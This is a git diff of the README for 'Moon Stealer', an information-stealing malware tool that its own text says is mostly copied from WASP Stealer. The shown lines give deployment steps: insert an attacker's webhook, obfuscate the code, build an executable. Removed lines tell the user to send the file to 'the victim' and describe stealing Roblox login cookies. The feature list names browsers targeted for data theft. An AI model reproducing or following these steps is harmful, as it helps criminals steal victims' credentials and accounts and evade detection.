@@ -20,13 +20,14 @@
 
 4. Open `main.py` with any text editor such as notepad
 
-5. Replace `X` with your webhook where it says `hook = "X"` inside of the `main.py` file
+5. Replace the webhook in line 16
 
 6. Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.com/pyd) (Recommended)
 
-7. Send `main.py` to the victim and make them run the file with python. (That's why you need python)
+7. Run `Convert-To-Exe.py` to convert it to a .exe file type.
  
-8.  When they run it... BOOM! Check your webhook, you will have all their info.
+8. check ur dist folder for your executable
+
 
 <a id="features"></a>
 
@@ -64,8 +65,7 @@
     - Browsers: Opera, Chrome, Brave, Yandex, Edge
 
 - Extras
-    - Gets information of the victim's device
-    - Sends roblox cookie (can be used to login their roblox account)
+    - Gets information of the victim's system
  
 
 ## Important
@@ -81,3 +81,5 @@ Moon Stealer is licensed under the <a href="https://mit-license.org/">MIT Licens
 - Join the [Discord](https://discord.gg/fnNd26Depz)
 
 Credits: WASP Stealer
+
+idk what other credits to give since its 70% wasp stealer
